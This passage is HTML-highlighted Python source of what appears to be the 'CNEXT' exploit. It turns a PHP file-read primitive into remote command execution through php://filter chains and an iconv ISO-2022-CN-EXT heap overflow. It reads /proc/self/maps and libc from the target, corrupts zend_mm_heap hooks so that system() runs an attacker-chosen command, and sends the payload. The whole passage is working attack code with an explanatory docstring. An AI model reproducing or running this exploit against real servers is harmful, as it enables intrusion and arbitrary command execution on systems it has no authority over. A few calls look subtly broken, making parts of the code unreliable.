class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.session.post(<span class="hljs-variable language_">self</span>.url, data=&#123;<span class="hljs-string">&quot;file&quot;</span>: path&#125;)<br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Returns the contents of a remote file.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        path = <span class="hljs-string">f&quot;php://filter/convert.base64-encode/resource=<span class="hljs-subst">&#123;path&#125;</span>&quot;</span><br>        response = <span class="hljs-variable language_">self</span>.send(path)<br>        data = response.re.search(<span class="hljs-string">b&quot;File contents: (.*)&quot;</span>, flags=re.S).group(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> base64.decode(data)<br><br><span class="hljs-meta">@entry</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&quot;Target URL&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;command&quot;</span>, <span class="hljs-string">&quot;Command to run on the system; limited to 0x140 bytes&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;sleep&quot;</span>, <span class="hljs-string">&quot;Time to sleep to assert that the exploit worked. By default, 1.&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;heap&quot;</span>, <span class="hljs-string">&quot;Address of the main zend_mm_heap structure.&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"></span></span><br><span class="hljs-params"><span class="hljs-meta">    <span class="hljs-string">&quot;pad&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-meta">    <span class="hljs-string">&quot;Number of 0x100 chunks to pad with. If the website makes a lot of heap &quot;</span></span></span><br><span class="hljs-params"><span class="hljs-meta">    <span class="hljs-string">&quot;operations with this size, increase this. Defaults to 20.&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-meta"></span>)</span><br><span class="hljs-meta">@dataclass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;CNEXT exploit: RCE using a file read primitive in PHP.&quot;&quot;&quot;</span><br><br>    url: <span class="hljs-built_in">str</span><br>    command: <span class="hljs-built_in">str</span><br>    sleep: <span class="hljs-built_in">int</span> = <span class="hljs-number">1</span><br>    heap: <span class="hljs-built_in">str</span> = <span class="hljs-literal">None</span><br>    pad: <span class="hljs-built_in">int</span> = <span class="hljs-number">20</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__post_init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.remote = Remote(<span class="hljs-variable language_">self</span>.url)<br>        <span class="hljs-variable language_">self</span>.log = logger(<span class="hljs-string">&quot;EXPLOIT&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.info = &#123;&#125;<br>        <span class="hljs-variable language_">self</span>.heap = <span class="hljs-variable language_">self</span>.heap <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(<span class="hljs-variable language_">self</span>.heap, <span class="hljs-number">16</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_vulnerable</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various</span><br><span class="hljs-string">        wrappers and filters that the exploit needs.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_download</span>(<span class="hljs-params">path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.remote.download(path)<br>            <span class="hljs-keyword">except</span> ConnectionError:<br>                failure(<span class="hljs-string">&quot;Target not [b]reachable[/] ?&quot;</span>)<br>            <br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_token</span>(<span class="hljs-params">text: <span class="hljs-built_in">str</span>, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>            result = safe_download(path)<br>            <span class="hljs-keyword">return</span> text.encode() == result<br><br>        text = tf.random.string(<span class="hljs-number">50</span>).encode()<br>        base64 = b64(text, misalign=<span class="hljs-literal">True</span>).decode()<br>        path = <span class="hljs-string">f&quot;data:text/plain;base64,<span class="hljs-subst">&#123;base64&#125;</span>&quot;</span><br>        <br>        result = safe_download(path)<br>        <br>        <span class="hljs-keyword">if</span> text <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> result:<br>            msg_failure(<span class="hljs-string">&quot;Remote.download did not return the test string&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--------------------&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Expected test string: <span class="hljs-subst">&#123;text&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Got: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--------------------&quot;</span>)<br>            failure(<span class="hljs-string">&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;</span>)<br><br>        msg_info(<span class="hljs-string">&quot;The [i]data://[/] wrapper works&quot;</span>)<br><br>        text = tf.random.string(<span class="hljs-number">50</span>)<br>        base64 = b64(text.encode(), misalign=<span class="hljs-literal">True</span>).decode()<br>        path = <span class="hljs-string">f&quot;php://filter//resource=data:text/plain;base64,<span class="hljs-subst">&#123;base64&#125;</span>&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_token(text, path):<br>            failure(<span class="hljs-string">&quot;The [i]php://filter/[/] wrapper does not work&quot;</span>)<br><br>        msg_info(<span class="hljs-string">&quot;The [i]php://filter/[/] wrapper works&quot;</span>)<br><br>        text = tf.random.string(<span class="hljs-number">50</span>)<br>        base64 = b64(compress(text.encode()), misalign=<span class="hljs-literal">True</span>).decode()<br>        path = <span class="hljs-string">f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,<span class="hljs-subst">&#123;base64&#125;</span>&quot;</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_token(text, path):<br>            failure(<span class="hljs-string">&quot;The [i]zlib[/] extension is not enabled&quot;</span>)<br><br>        msg_info(<span class="hljs-string">&quot;The [i]zlib[/] extension is enabled&quot;</span>)<br><br>        msg_success(<span class="hljs-string">&quot;Exploit preconditions are satisfied&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-keyword">with</span> msg_status(<span class="hljs-string">f&quot;Downloading [i]<span class="hljs-subst">&#123;path&#125;</span>[/]...&quot;</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.remote.download(path)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_regions</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">list</span>[Region]:<br>        <span class="hljs-string">&quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;</span><br>        maps = <span class="hljs-variable language_">self</span>.get_file(<span class="hljs-string">&quot;/proc/self/maps&quot;</span>)<br>        maps = maps.decode()<br>        PATTERN = re.<span class="hljs-built_in">compile</span>(<br>            <span class="hljs-string">r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot;</span> <span class="hljs-string">r&quot;.*&quot;</span> <span class="hljs-string">r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot;</span> <span class="hljs-string">r&quot;(.*)&quot;</span><br>        )<br>        regions = []<br>        <span class="hljs-keyword">for</span> region <span class="hljs-keyword">in</span> table.split(maps, strip=<span class="hljs-literal">True</span>):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> := PATTERN.<span class="hljs-keyword">match</span>(region):<br>                start = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-number">16</span>)<br>                stop = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>)<br>                permissions = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>)<br>                path = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">4</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;[&quot;</span> <span class="hljs-keyword">in</span> path:<br>                    path = path.rsplit(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-number">1</span>)[-<span class="hljs-number">1</span>]<br>                <span class="hljs-keyword">else</span>:<br>                    path = <span class="hljs-string">&quot;&quot;</span><br>                current = Region(start, stop, permissions, path)<br>                regions.append(current)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(maps)<br>                failure(<span class="hljs-string">&quot;Unable to parse memory mappings&quot;</span>)<br><br>        <span class="hljs-variable language_">self</span>.log.info(<span class="hljs-string">f&quot;Got <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(regions)&#125;</span> memory regions&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> regions<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_symbols_and_addresses</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;</span><br>        regions = <span class="hljs-variable language_">self</span>.get_regions()<br><br>        LIBC_FILE = <span class="hljs-string">&quot;/dev/shm/cnext-libc&quot;</span><br><br>        <span class="hljs-comment"># PHP&#x27;s heap</span><br><br>        <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;heap&quot;</span>] = <span class="hljs-variable language_">self</span>.heap <span class="hljs-keyword">or</span> <span class="hljs-variable language_">self</span>.find_main_heap(regions)<br><br>        <span class="hljs-comment"># Libc</span><br><br>        libc = <span class="hljs-variable language_">self</span>._get_region(regions, <span class="hljs-string">&quot;libc-&quot;</span>, <span class="hljs-string">&quot;libc.so&quot;</span>)<br><br>        <span class="hljs-variable language_">self</span>.download_file(libc.path, LIBC_FILE)<br><br>        <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;libc&quot;</span>] = ELF(LIBC_FILE, checksec=<span class="hljs-literal">False</span>)<br>        <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;libc&quot;</span>].address = libc.start<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_get_region</span>(<span class="hljs-params">self, regions: <span class="hljs-built_in">list</span>[Region], *names: <span class="hljs-built_in">str</span></span>) -&gt; Region:<br>        <span class="hljs-string">&quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> region <span class="hljs-keyword">in</span> regions:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(name <span class="hljs-keyword">in</span> region.path <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> names):<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            failure(<span class="hljs-string">&quot;Unable to locate region&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> region<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">download_file</span>(<span class="hljs-params">self, remote_path: <span class="hljs-built_in">str</span>, local_path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;</span><br>        data = <span class="hljs-variable language_">self</span>.get_file(remote_path)<br>        Path(local_path).write(data)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_main_heap</span>(<span class="hljs-params">self, regions: <span class="hljs-built_in">list</span>[Region]</span>) -&gt; Region:<br>        <span class="hljs-comment"># Any anonymous RW region with a size superior to the base heap size is a</span><br>        <span class="hljs-comment"># candidate. The heap is at the bottom of the region.</span><br>        heaps = [<br>            region.stop - HEAP_SIZE + <span class="hljs-number">0x40</span><br>            <span class="hljs-keyword">for</span> region <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(regions)<br>            <span class="hljs-keyword">if</span> region.permissions == <span class="hljs-string">&quot;rw-p&quot;</span><br>            <span class="hljs-keyword">and</span> region.size &gt;= HEAP_SIZE<br>            <span class="hljs-keyword">and</span> region.stop &amp; (HEAP_SIZE-<span class="hljs-number">1</span>) == <span class="hljs-number">0</span><br>            <span class="hljs-keyword">and</span> region.path <span class="hljs-keyword">in</span> (<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;[anon:zend_alloc]&quot;</span>)<br>        ]<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> heaps:<br>            failure(<span class="hljs-string">&quot;Unable to find PHP&#x27;s main heap in memory&quot;</span>)<br><br>        first = heaps[<span class="hljs-number">0</span>]<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(heaps) &gt; <span class="hljs-number">1</span>:<br>            heaps = <span class="hljs-string">&quot;, &quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">hex</span>, heaps))<br>            msg_info(<span class="hljs-string">f&quot;Potential heaps: [i]<span class="hljs-subst">&#123;heaps&#125;</span>[/] (using first)&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            msg_info(<span class="hljs-string">f&quot;Using [i]<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(first)&#125;</span>[/] as heap&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> first<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-variable language_">self</span>.check_vulnerable()<br>        <span class="hljs-variable language_">self</span>.get_symbols_and_addresses()<br>        <span class="hljs-variable language_">self</span>.exploit()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit_path</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;On each step of the exploit, a filter will process each chunk one after the</span><br><span class="hljs-string">        other. Processing generally involves making some kind of operation either</span><br><span class="hljs-string">        on the chunk or in a destination chunk of the same size. Each operation is</span><br><span class="hljs-string">        applied on every single chunk; you cannot make PHP apply iconv on the first 10</span><br><span class="hljs-string">        chunks and leave the rest in place. That&#x27;s where the difficulties come from.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Keep in mind that we know the address of the main heap, and the libraries.</span><br><span class="hljs-string">        ASLR/PIE do not matter here.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        The idea is to use the bug to make the freelist for chunks of size 0x100 point</span><br><span class="hljs-string">        lower. For instance, we have the following free list:</span><br><span class="hljs-string"></span><br><span class="hljs-string">        ... -&gt; 0x7fffAABBCC900 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB00</span><br><span class="hljs-string"></span><br><span class="hljs-string">        By triggering the bug from chunk ..900, we get:</span><br><span class="hljs-string"></span><br><span class="hljs-string">        ... -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB48 -&gt; ???</span><br><span class="hljs-string"></span><br><span class="hljs-string">        That&#x27;s step 3.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Now, in order to control the free list, and make it point whereever we want,</span><br><span class="hljs-string">        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,</span><br><span class="hljs-string">        we&#x27;d have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.</span><br><span class="hljs-string">        That&#x27;s step 2.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Now, if we were to perform step2 an then step3 without anything else, we&#x27;d have</span><br><span class="hljs-string">        a problem: after step2 has been processed, the free list goes bottom-up, like:</span><br><span class="hljs-string"></span><br><span class="hljs-string">        0x7fffAABBCCB00 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCC900</span><br><span class="hljs-string"></span><br><span class="hljs-string">        We need to go the other way around. That&#x27;s why we have step 1: it just allocates</span><br><span class="hljs-string">        chunks. When they get freed, they reverse the free list. Now step2 allocates in</span><br><span class="hljs-string">        reverse order, and therefore after step2, chunks are in the correct order.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Another problem comes up.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.</span><br><span class="hljs-string">        Since step2 creates chunks that contain pointers and pointers are generally not</span><br><span class="hljs-string">        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.</span><br><span class="hljs-string">        To avoid this, we put the chunks in step2 at the very end of the chain, and</span><br><span class="hljs-string">        prefix them with `0\n`. When dechunked (right before the iconv), they will</span><br><span class="hljs-string">        &quot;disappear&quot; from the chain, preserving them from the character set conversion</span><br><span class="hljs-string">        and saving us from an unwanted processing error that would stop the processing</span><br><span class="hljs-string">        chain.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        After step3 we have a corrupted freelist with an arbitrary pointer into it. We</span><br><span class="hljs-string">        don&#x27;t know the precise layout of the heap, but we know that at the top of the</span><br><span class="hljs-string">        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.</span><br><span class="hljs-string">        Its free_slot[] array contains a pointer to each free list. By overwriting it,</span><br><span class="hljs-string">        we can make PHP allocate chunks whereever we want. In addition, its custom_heap</span><br><span class="hljs-string">        field contains pointers to hook functions for emalloc, efree, and erealloc</span><br><span class="hljs-string">        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and</span><br><span class="hljs-string">        then overwrite the use_custom_heap flag to make PHP use these function pointers</span><br><span class="hljs-string">        instead. We can now do our favorite CTF technique and get a call to</span><br><span class="hljs-string">        system(&lt;chunk&gt;).</span><br><span class="hljs-string">        We make sure that the &quot;system&quot; command kills the current process to avoid other</span><br><span class="hljs-string">        system() calls with random chunk data, leading to undefined behaviour.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        The pad blocks just &quot;pad&quot; our allocations so that even if the heap of the</span><br><span class="hljs-string">        process is in a random state, we still get contiguous, in order chunks for our</span><br><span class="hljs-string">        exploit.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Therefore, the whole process described here CANNOT crash. Everything falls</span><br><span class="hljs-string">        perfectly in place, and nothing can get in the middle of our allocations.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br><br>        LIBC = <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;libc&quot;</span>]<br>        ADDR_EMALLOC = LIBC.symbols[<span class="hljs-string">&quot;__libc_malloc&quot;</span>]<br>        ADDR_EFREE = LIBC.symbols[<span class="hljs-string">&quot;__libc_system&quot;</span>]<br>        ADDR_EREALLOC = LIBC.symbols[<span class="hljs-string">&quot;__libc_realloc&quot;</span>]<br><br>        ADDR_HEAP = <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;heap&quot;</span>]<br>        ADDR_FREE_SLOT = ADDR_HEAP + <span class="hljs-number">0x20</span><br>        ADDR_CUSTOM_HEAP = ADDR_HEAP + <span class="hljs-number">0x0168</span><br><br>        ADDR_FAKE_BIN = ADDR_FREE_SLOT - <span class="hljs-number">0x10</span><br><br>        CS = <span class="hljs-number">0x100</span><br><br>        <span class="hljs-comment"># Pad needs to stay at size 0x100 at every step</span><br>        pad_size = CS - <span class="hljs-number">0x18</span><br>        pad = <span class="hljs-string">b&quot;\x00&quot;</span> * pad_size<br>        pad = chunked_chunk(pad, <span class="hljs-built_in">len</span>(pad) + <span class="hljs-number">6</span>)<br>        pad = chunked_chunk(pad, <span class="hljs-built_in">len</span>(pad) + <span class="hljs-number">6</span>)<br>        pad = chunked_chunk(pad, <span class="hljs-built_in">len</span>(pad) + <span class="hljs-number">6</span>)<br>        pad = compressed_bucket(pad)<br><br>        step1_size = <span class="hljs-number">1</span><br>        step1 = <span class="hljs-string">b&quot;\x00&quot;</span> * step1_size<br>        step1 = chunked_chunk(step1)<br>        step1 = chunked_chunk(step1)<br>        step1 = chunked_chunk(step1, CS)<br>        step1 = compressed_bucket(step1)<br><br>        <span class="hljs-comment"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span><br>        <span class="hljs-comment"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;</span><br><br>        step2_size = <span class="hljs-number">0x48</span><br>        step2 = <span class="hljs-string">b&quot;\x00&quot;</span> * (step2_size + <span class="hljs-number">8</span>)<br>        step2 = chunked_chunk(step2, CS)<br>        step2 = chunked_chunk(step2)<br>        step2 = compressed_bucket(step2)<br><br>        step2_write_ptr = <span class="hljs-string">b&quot;0\n&quot;</span>.ljust(step2_size, <span class="hljs-string">b&quot;\x00&quot;</span>) + p64(ADDR_FAKE_BIN)<br>        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)<br>        step2_write_ptr = chunked_chunk(step2_write_ptr)<br>        step2_write_ptr = compressed_bucket(step2_write_ptr)<br><br>        step3_size = CS<br><br>        step3 = <span class="hljs-string">b&quot;\x00&quot;</span> * step3_size<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(step3) == CS<br>        step3 = chunked_chunk(step3)<br>        step3 = chunked_chunk(step3)<br>        step3 = chunked_chunk(step3)<br>        step3 = compressed_bucket(step3)<br><br>        step3_overflow = <span class="hljs-string">b&quot;\x00&quot;</span> * (step3_size - <span class="hljs-built_in">len</span>(BUG)) + BUG<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(step3_overflow) == CS<br>        step3_overflow = chunked_chunk(step3_overflow)<br>        step3_overflow = chunked_chunk(step3_overflow)<br>        step3_overflow = chunked_chunk(step3_overflow)<br>        step3_overflow = compressed_bucket(step3_overflow)<br><br>        step4_size = CS<br>        step4 = <span class="hljs-string">b&quot;=00&quot;</span> + <span class="hljs-string">b&quot;\x00&quot;</span> * (step4_size - <span class="hljs-number">1</span>)<br>        step4 = chunked_chunk(step4)<br>        step4 = chunked_chunk(step4)<br>        step4 = chunked_chunk(step4)<br>        step4 = compressed_bucket(step4)<br><br>        <span class="hljs-comment"># This chunk will eventually overwrite mm_heap-&gt;free_slot</span><br>        <span class="hljs-comment"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span><br>        step4_pwn = ptr_bucket(<br>            <span class="hljs-number">0x200000</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-comment"># free_slot</span><br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            ADDR_CUSTOM_HEAP,  <span class="hljs-comment"># 0x18</span><br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            ADDR_HEAP,  <span class="hljs-comment"># 0x140</span><br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            size=CS,<br>        )<br><br>        step4_custom_heap = ptr_bucket(<br>            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=<span class="hljs-number">0x18</span><br>        )<br><br>        step4_use_custom_heap_size = <span class="hljs-number">0x140</span><br><br>        COMMAND = <span class="hljs-variable language_">self</span>.command<br>        COMMAND = <span class="hljs-string">f&quot;kill -9 $PPID; <span class="hljs-subst">&#123;COMMAND&#125;</span>&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.sleep:<br>            COMMAND = <span class="hljs-string">f&quot;sleep <span class="hljs-subst">&#123;self.sleep&#125;</span>; <span class="hljs-subst">&#123;COMMAND&#125;</span>&quot;</span><br>        COMMAND = COMMAND.encode() + <span class="hljs-string">b&quot;\x00&quot;</span><br><br>        <span class="hljs-keyword">assert</span> (<br>            <span class="hljs-built_in">len</span>(COMMAND) &lt;= step4_use_custom_heap_size<br>        ), <span class="hljs-string">f&quot;Command too big (<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(COMMAND)&#125;</span>), it must be strictly inferior to <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(step4_use_custom_heap_size)&#125;</span>&quot;</span><br>        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>        step4_use_custom_heap = COMMAND<br>        step4_use_custom_heap = qpe(step4_use_custom_heap)<br>        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)<br>        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)<br>        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)<br>        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)<br><br>        pages = (<br>            step4 * <span class="hljs-number">3</span><br>            + step4_pwn<br>            + step4_custom_heap<br>            + step4_use_custom_heap<br>            + step3_overflow<br>            + pad * <span class="hljs-variable language_">self</span>.pad<br>            + step1 * <span class="hljs-number">3</span><br>            + step2_write_ptr<br>            + step2 * <span class="hljs-number">2</span><br>        )<br><br>        resource = compress(compress(pages))<br>        resource = b64(resource)<br>        resource = <span class="hljs-string">f&quot;data:text/plain;base64,<span class="hljs-subst">&#123;resource.decode()&#125;</span>&quot;</span><br><br>        filters = [<br>            <span class="hljs-comment"># Create buckets</span><br>            <span class="hljs-string">&quot;zlib.inflate&quot;</span>,<br>            <span class="hljs-string">&quot;zlib.inflate&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 0: Setup heap</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.L1.L1&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 1: Reverse FL order</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.L1.L1&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 2: Put fake pointer and make FL order back to normal</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.L1.L1&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 3: Trigger overflow</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span><br>            <span class="hljs-string">&quot;convert.quoted-printable-decode&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.L1.L1&quot;</span>,<br>        ]<br>        filters = <span class="hljs-string">&quot;|&quot;</span>.join(filters)<br>        path = <span class="hljs-string">f&quot;php://filter/read=<span class="hljs-subst">&#123;filters&#125;</span>/resource=<span class="hljs-subst">&#123;resource&#125;</span>&quot;</span><br><br>        <span class="hljs-keyword">return</span> path<br><br><span class="hljs-meta">    @inform(<span class="hljs-params"><span class="hljs-string">&quot;Triggering...&quot;</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        path = <span class="hljs-variable language_">self</span>.build_exploit_path()<br>        start = time.time()<br><br>        <span class="hljs-keyword">try</span>:<br>            response = <span class="hljs-variable language_">self</span>.remote.send(path)<br>            <span class="hljs-keyword">if</span>(response.status_code == <span class="hljs-number">414</span>):<br>                <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;URI too large!!!&quot;</span>)<br>        <span class="hljs-keyword">except</span> (ConnectionError, ChunkedEncodingError):<br>            <span class="hljs-keyword">pass</span><br>        <br>        msg_print()<br>        <br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.sleep:<br>            msg_print(<span class="hljs-string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;</span>)<br>        <span class="hljs-keyword">elif</span> start + <span class="hljs-variable language_">self</span>.sleep &lt;= time.time():<br>            msg_print(<span class="hljs-string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># Wrong heap, maybe? If the exploited suggested others, use them!</span><br>            msg_print(<span class="hljs-string">&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;</span>)<br>        <br>        msg_print()<br><br><br><span 